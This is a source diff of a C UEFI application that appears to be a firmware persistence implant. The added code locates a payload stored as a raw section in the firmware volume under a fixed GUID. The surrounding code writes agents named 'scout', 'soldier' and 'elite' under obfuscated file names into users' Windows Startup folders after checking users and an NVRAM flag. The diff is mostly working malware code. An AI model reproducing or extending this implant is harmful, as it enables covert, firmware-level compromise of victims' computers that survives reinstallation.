@@ -1,6 +1,7 @@
 /*********************************/
 /*   Developer: Giovanni Cino    */
 /*********************************/
+#define IMAGE_FILE_MACHINE_ARMTHUMB_MIXED  0x01c2
 
 #include <Uefi.h>
 #include <Guid/FileInfo.h>
@@ -15,21 +16,35 @@
 #include <Library/PrintLib.h>
 #include <Library/UefiLib.h>
 
-#include "PeImage.h"
+#include <Protocol/BlockIo.h>
+#include <Protocol/DiskIo.h>
+#include <Protocol/SimpleFileSystem.h>
+#include <Protocol/UnicodeCollation.h>
+#include <Protocol/LoadedImage.h>
+#include <Pi/PiMultiPhase.h>
+#include <Protocol/FirmwareVolume2.h>
+#include <Protocol/FirmwareVolume.h>
+#include <Protocol/LoadedImage.h>
+#include <Protocol/DevicePath.h>
+
+#include <Library/PcdLib.h>
+#include <Library/DebugLib.h>
+#include <Library/UefiLib.h>
+#include <Library/BaseLib.h>
+#include <Library/BaseMemoryLib.h>
+#include <Library/MemoryAllocationLib.h>
+#include <Library/UefiBootServicesTableLib.h>
+#include <Library/UefiRuntimeServicesTableLib.h>
+
 
 //#define FORCE_DEBUG
+
+
 
 #define EFI_GLOBAL_FILE_VARIABLE_GUID \
   { \
     0x8BE4DF61, 0x93CA, 0x11d2, {0xAA, 0x0D, 0x00, 0xE0, 0x98, 0x30, 0x22, 0x88} \
   }
-
-/*
-#define FILE_NAME_SCOUT L"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\scoute.exe"
-#define FILE_NAME_SOLDIER L"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\soldier.exe"
-#define FILE_NAME_ELITE  L"\\AppData\\Local\\elite"
-#define DIR_NAME_ELITE L"\\AppData\\Local\\Microsoft\\elite"
-*/
 
 #define FILE_NAME_SCOUT L"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
 #define FILE_NAME_SOLDIER L"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
@@ -42,8 +57,6 @@
 #define FIND_XXXXX_FILE_BUFFER_SIZE (SIZE_OF_EFI_FILE_INFO + MAX_FILE_NAME_LEN)
 #define CALC_OFFSET(type, base, offset) (type)((UINTN)base + (UINT32) offset)
 
-#include "sraw.h"
-
 #ifdef FORCE_DEBUG
 UINT16 g_NAME_SCOUT[] =   L"scoute.exe";
 UINT16 g_NAME_SOLDIER[] = L"soldier.exe";
@@ -54,9 +67,6 @@ UINT16 g_NAME_SCOUT[] =   L"6To_60S7K_FU06yjEhjh5dpFw96549UU";
 UINT16 g_NAME_SOLDIER[] = L"kdfas7835jfwe09j29FKFLDOR3r35fJR";
 UINT16 g_NAME_ELITE[]   = L"eorpekf3904kLDKQO023iosdn93smMXK";
 #endif
-
-
-
 //non mi piace usare queste due variabili globali ma altrimenti sporcherei troppo il codice
 UINTN pSectiondata;
 UINTN VirtualSize;
@@ -69,104 +79,8 @@ UefiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable);
 
 extern EFI_RUNTIME_SERVICES  *gRT;
 
-BOOLEAN
-EFIAPI
-ListSectionData(
-IN VOID  *ImageBase,
-OUT UINTN* pSectiondata,
-OUT UINTN*  VirtualSize
-)
-{
-   UINT16 x;
+typedef UINT8 EFI_SECTION_TYPE;
 
-   EFI_IMAGE_DOS_HEADER *ImageDosHeader;
-   EFI_IMAGE_SECTION_HEADER *ImageSectionHeader;
-#ifdef _WIN64
-   EFI_IMAGE_NT_HEADERS64 *ImageNtHeaders;
-#else
-   EFI_IMAGE_NT_HEADERS32 *ImageNtHeaders;
-#endif
-
-   UINT8 *sectiondata;
-   char SectionName[9] = { 0 };
-   ImageDosHeader = ImageBase;
-
-#ifdef FORCE_DEBUG
-   Print(L"\nOpening RAM...\n");
-#endif
-
-   // controlliamo il Dos Header
-   if (ImageDosHeader->e_magic != EFI_IMAGE_DOS_SIGNATURE)
-   {
-#ifdef FORCE_DEBUG
-      Print(L"Invalid Dos Header\n");
-#endif
-      return FALSE;
-   }
-
-#ifdef _WIN64
-   ImageNtHeaders = (EFI_IMAGE_NT_HEADERS64 *) 
-      (ImageDosHeader->e_lfanew + (UINT64) ImageDosHeader);
-#else
-   ImageNtHeaders = (EFI_IMAGE_NT_HEADERS32 *) 
-      (ImageDosHeader->e_lfanew + (UINT32) ImageDosHeader);
-#endif
-
-   // controlliamo il PE Header
-   if (ImageNtHeaders->Signature != EFI_IMAGE_NT_SIGNATURE)
-   {
-#ifdef FORCE_DEBUG
-      Print(L"Invalid PE Header\n");
-#endif
-      return FALSE;
-   }
-
-   // prende l'indirizzo della prima sezione
-   ImageSectionHeader = EFI_IMAGE_FIRST_SECTION(ImageNtHeaders);
-
-
-   // mostra la section table
-   for (x = 0; x < ImageNtHeaders->FileHeader.NumberOfSections; x++)
-   {
-		memcpy(SectionName, ImageSectionHeader[x].Name, 
-		 EFI_IMAGE_SIZEOF_SHORT_NAME);
-
-		sectiondata = CALC_OFFSET(char *, ImageDosHeader, ImageSectionHeader[x].VirtualAddress);
-
-#ifdef FORCE_DEBUG
-		Print(L"\n\nSection Name: %a\nVirtual Address: %08X\nVirtual Size: %08X\nRaw Address: %08X\nRaw Size: %08X\nCharacteristics: %08X\nsectiondata: %08X\n",
-		SectionName, ImageSectionHeader[x].VirtualAddress,
-		ImageSectionHeader[x].Misc.VirtualSize,
-		ImageSectionHeader[x].PointerToRawData,
-		ImageSectionHeader[x].SizeOfRawData,
-		ImageSectionHeader[x].Characteristics,
-		sectiondata);
-#endif
-
-		if(!strcmp(".sraw",SectionName)) 
-		{
-			//CpuBreakpoint();
-		  //*VirtualSize=ImageSectionHeader[x].Misc.VirtualSize;
-		  *pSectiondata=(UINTN)sectiondata;
-		  *VirtualSize=0;
-		  //*VirtualSize =( ((UINTN*)sectiondata)[0] | ((UINTN*)sectiondata)[1] << 8 |  ((UINTN*)sectiondata)[2] << 16 | ((UINTN*)sectiondata)[3] << 24 );
-		  *VirtualSize = sectiondata[0] + sectiondata[1] * 0x100 +  sectiondata[2] * 0x10000 + sectiondata[3] * 0x1000000;
-
-
-#ifdef FORCE_DEBUG
-		  Print(L"VirtualSize=%x [0]=%x [1]=%x [2]=%x [3]=%x\n",*VirtualSize,((UINT8*)sectiondata)[0],((UINT8*)sectiondata)[1] ,((UINT8*)sectiondata)[2] ,((UINT8*)sectiondata)[3] );
-		  Print(L"VirtualSize=%x [0]=%x [1]=%x [2]=%x [3]=%x\n",*VirtualSize,((UINT8*)sectiondata)[0],((UINT8*)sectiondata)[1] * 0x100 ,((UINT8*)sectiondata)[2] * 0x10000,((UINT8*)sectiondata)[3] * 0x1000000);
-#endif
-		 // CpuBreakpoint();
-
-		  return TRUE;
-		}
-   }
-
-   	*VirtualSize=0;
-	*pSectiondata=0;
-	return FALSE;
-}
 
 
 /** Leggo in NvRam la variabile fTA
@@ -414,8 +328,12 @@ InstallAgent(
 #endif
 		return Status;
 	}
+	
+#ifdef FORCE_DEBUG
+		Print(L"FileHandle->Write ... VirtualSize=%x [0]=%x [1]=%x [2]=%x [3]=%x\n",VirtualSize,((UINT8*)pSectiondata)[0],((UINT8*)pSectiondata)[1] * 0x100 ,((UINT8*)pSectiondata)[2] * 0x10000,((UINT8*)pSectiondata)[3] * 0x1000000);
+#endif
 
-	Status=FileHandle->Write(FileHandle,&VirtualSize,(UINT8*)(pSectiondata+4));
+	Status=FileHandle->Write(FileHandle,&VirtualSize,(UINT8*)(pSectiondata));
 	if( Status != EFI_SUCCESS ) 
 	{
 #ifdef FORCE_DEBUG
@@ -1282,20 +1200,308 @@ CheckUsers(
     return FALSE;
 }
 
+EFI_STATUS
+GetImageFromFv (
+//#if (PI_SPECIFICATION_VERSION < 0x00010000)
+//  IN  EFI_FIRMWARE_VOLUME_PROTOCOL  *Fv,
+//#else
+  IN  EFI_FIRMWARE_VOLUME2_PROTOCOL *Fv,
+//#endif
+  IN  EFI_GUID           *NameGuid,
+  IN  EFI_SECTION_TYPE   SectionType,
+  OUT VOID               **Buffer,
+  OUT UINTN              *Size
+  )
+{
+  EFI_STATUS                Status;
+  EFI_FV_FILETYPE           FileType;
+  EFI_FV_FILE_ATTRIBUTES    Attributes;
+  UINT32                    AuthenticationStatus;
+
+  //
+  // Read desired section content in NameGuid file
+  //
+  *Buffer     = NULL;
+  *Size       = 0;
+  Status      = Fv->ReadSection (
+                      Fv,
+                      NameGuid,
+                      SectionType,
+                      0,
+                      Buffer,
+                      Size,
+                      &AuthenticationStatus
+                      );
+
+  if (EFI_ERROR (Status) && (SectionType == EFI_SECTION_TE)) {
+    //
+    // Try reading PE32 section, since the TE section does not exist
+    //
+    *Buffer = NULL;
+    *Size   = 0;
+    Status  = Fv->ReadSection (
+                    Fv,
+                    NameGuid,
+                    EFI_SECTION_PE32,
+                    0,
+                    Buffer,
+                    Size,
+                    &AuthenticationStatus
+                    );
+  }
+
+  if (EFI_ERROR (Status) && 
+      ((SectionType == EFI_SECTION_TE) || (SectionType == EFI_SECTION_PE32))) {
+    //
+    // Try reading raw file, since the desired section does not exist
+    //
+    *Buffer = NULL;
+    *Size   = 0;
+    Status  = Fv->ReadFile (
+                    Fv,
+                    NameGuid,
+                    Buffer,
+                    Size,
+                    &FileType,
+                    &Attributes,
+                    &AuthenticationStatus
+                    );
+  }
+
+  return Status;
+}
+
+
+
+EFI_STATUS
+GetImageEx (
+  IN  EFI_HANDLE         ImageHandle,
+  IN  EFI_GUID           *NameGuid,
+  IN  EFI_SECTION_TYPE   SectionType,
+  OUT VOID               **Buffer,
+  OUT UINTN              *Size,
+  BOOLEAN                WithinImageFv
+  )
+{
+  EFI_STATUS                    Status;
+  EFI_HANDLE                    *HandleBuffer;
+  UINTN                         HandleCount;
+  UINTN                         Index;
+  EFI_LOADED_IMAGE_PROTOCOL     *LoadedImage;
+//#if (PI_SPECIFICATION_VERSION < 0x00010000)
+//  EFI_FIRMWARE_VOLUME_PROTOCOL  *ImageFv;
+//  EFI_FIRMWARE_VOLUME_PROTOCOL  *Fv;
+//#else
+  EFI_FIRMWARE_VOLUME2_PROTOCOL *ImageFv;
+  EFI_FIRMWARE_VOLUME2_PROTOCOL *Fv;
+//#endif
+
+  UINTN fEfiFirmwareVolumeProtocol=1;
+ 
+  EFI_GUID  gEfiFirmwareVolumeProtocolGuid = EFI_FIRMWARE_VOLUME_PROTOCOL_GUID;
+  EFI_GUID  gEfiFirmwareVolume2ProtocolGuid = EFI_FIRMWARE_VOLUME2_PROTOCOL_GUID;
+
+#ifdef FORCE_DEBUG
+  Print(L"step 2\n");
+#endif
+
+  if (ImageHandle == NULL && WithinImageFv) 
+  {
+    return EFI_INVALID_PARAMETER;
+  }
+
+#ifdef FORCE_DEBUG
+  Print(L"step 3\n");
+#endif
+
+  Status  = EFI_NOT_FOUND;
+  ImageFv = NULL;
+
+#ifdef FORCE_DEBUG
+  Print(L"step 4 %x\n",ImageHandle);
+#endif
+
+  if (ImageHandle != NULL) 
+  {
+    Status = gBS->HandleProtocol (
+               ImageHandle,
+               &gEfiLoadedImageProtocolGuid,
+               (VOID **) &LoadedImage
+               );
+    if (EFI_ERROR (Status)) {
+#ifdef FORCE_DEBUG
+      Print(L"step 4b %x\n",Status);
+#endif
+      return Status;
+    }
+#ifdef FORCE_DEBUG	
+	Print(L"step 4c %x\n",Status);
+#endif
+  }
+#ifdef FORCE_DEBUG
+  Print(L"step 6\n");
+#endif
+
+  Status = gBS->LocateHandleBuffer (
+                  ByProtocol,
+                //#if (PI_SPECIFICATION_VERSION < 0x00010000)
+                  &gEfiFirmwareVolumeProtocolGuid,
+                //#else
+                  //&gEfiFirmwareVolume2ProtocolGuid,
+                //#endif
+                  NULL,
+                  &HandleCount,
+                  &HandleBuffer
+                  );
+
+  if (EFI_ERROR (Status)) 
+  {
+#ifdef FORCE_DEBUG
+		Print(L"step 7 %x\n",Status);
+#endif
+
+		Status = gBS->LocateHandleBuffer (
+                  ByProtocol,
+                //#if (PI_SPECIFICATION_VERSION < 0x00010000)
+                  //&gEfiFirmwareVolumeProtocolGuid,
+                //#else
+                  &gEfiFirmwareVolume2ProtocolGuid,
+                //#endif
+                  NULL,
+                  &HandleCount,
+                  &HandleBuffer
+                  );
+
+		if (EFI_ERROR (Status)) 
+		{
+#ifdef FORCE_DEBUG
+			Print(L"step 7b %x\n",Status);
+#endif
+
+			return Status;
+		 }
+		else
+			fEfiFirmwareVolumeProtocol=2;
+
+  }
+  else 
+		fEfiFirmwareVolumeProtocol=1;
+#ifdef FORCE_DEBUG
+  Print(L"step 8\n");
+#endif
+
+  //
+  // Find desired image in all Fvs
+  //
+  for (Index = 0; Index < HandleCount; ++Index) 
+  {
+#ifdef FORCE_DEBUG
+	Print(L"step 9\n");
+#endif
+
+	if(fEfiFirmwareVolumeProtocol==1)
+	{
+		Status = gBS->HandleProtocol (
+                    HandleBuffer[Index],
+                  //#if (PI_SPECIFICATION_VERSION < 0x00010000)
+                    &gEfiFirmwareVolumeProtocolGuid,
+                  //#else
+                    //&gEfiFirmwareVolume2ProtocolGuid,
+                  //#endif
+                    (VOID**)&Fv
+                    );
+	}
+	else
+	{
+		Status = gBS->HandleProtocol (
+                    HandleBuffer[Index],
+                  //#if (PI_SPECIFICATION_VERSION < 0x00010000)
+                    //&gEfiFirmwareVolumeProtocolGuid,
+                  //#else
+                    &gEfiFirmwareVolume2ProtocolGuid,
+                  //#endif
+                    (VOID**)&Fv
+                    );	
+	}
+
+
+
+
+    if (EFI_ERROR (Status)) 
+	{
+#ifdef FORCE_DEBUG
+      Print(L"step 10\n");
+#endif
+      gBS->FreePool(HandleBuffer);
+      return Status;
+    }
+
+    if (ImageFv != NULL && Fv == ImageFv) 
+	{
+#ifdef FORCE_DEBUG
+      Print(L"step 11\n");
+#endif
+      continue;
+    }
+
+    Status = GetImageFromFv (Fv, NameGuid, SectionType, Buffer, Size);
+
+    if (!EFI_ERROR (Status)) 
+	{
+#ifdef FORCE_DEBUG
+	  Print(L"step 12\n");
+#endif
+      break;
+    }
+  }
+#ifdef FORCE_DEBUG
+  Print(L"step 13\n");
+#endif
+  gBS->FreePool(HandleBuffer);
+
+  //
+  // Not found image
+  //
+  if (Index == HandleCount) 
+  {
+#ifdef FORCE_DEBUG
+    Print(L"step 14\n");
+#endif
+    return EFI_NOT_FOUND;
+  }
+
+  return EFI_SUCCESS;
+}
+
+
 
 EFI_STATUS                                     // Entry Point
 UefiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable)
 {
 	EFI_STATUS                    Status = EFI_SUCCESS;
 	EFI_LOADED_IMAGE_PROTOCOL     *LoadedImage;  
+	UINT8* Buffer;
+	UINTN Size;
+	EFI_GUID SOAPP =
+	{
+		0xeaea9aec,
+		0xc9c1,
+		0x46e2,
+		{ 0x9d, 0x52, 0x43, 0x2a, 0xd2, 0x5a, 0x09, 0x09 }
+	};
 
-	
 	//CpuBreakpoint();
 	
+#ifdef FORCE_DEBUG
+	Print(L"parte 1\n");
+#endif
 
 	//Step 1
 	if (CheckfTA()== TRUE) 
 		return TRUE;
+#ifdef FORCE_DEBUG
+	Print(L"parte 2\n");
+#endif
 
 	Status = gBS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, &LoadedImage);
    
@@ -1306,12 +1512,41 @@ UefiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable)
 #endif
 		return Status;
 	}
+#ifdef FORCE_DEBUG
+	Print(L"parte 3\n");
+#endif
 
-	ListSectionData(LoadedImage->ImageBase,&pSectiondata,&VirtualSize);
+	VirtualSize=0;
+	pSectiondata=0;
 
-	//Setp 2
-	if (CheckUsers(LoadedImage->DeviceHandle) == FALSE) 
-		return TRUE;
+	if(GetImageEx (ImageHandle, &SOAPP, EFI_SECTION_RAW, &Buffer, &Size, FALSE)==EFI_SUCCESS)
+	{
+#ifdef FORCE_DEBUG
+		Print(L"parte 4\n");
+#endif
+
+		VirtualSize=Size;
+		pSectiondata=(UINTN)Buffer;	
+
+#ifdef FORCE_DEBUG
+		Print(L"B0=%x B1=%x  %c%c\n",Buffer[0],Buffer[1],Buffer[0],Buffer[1]);
+#endif
+		//CpuBreakpoint();
+		
+		//Setp 2
+		if (CheckUsers(LoadedImage->DeviceHandle) == FALSE) 
+			return TRUE;
+
+#ifdef FORCE_DEBUG
+		Print(L"parte 5\n");
+#endif
+	}
+#ifdef FORCE_DEBUG
+	Print(L"parte 6\n");
+	Print(L"B0=%x B1=%x  %c%c\n",Buffer[0],Buffer[1],Buffer[0],Buffer[1]);
+	//CpuBreakpoint();
+#endif
+	
 
 	return EFI_SUCCESS;
 }
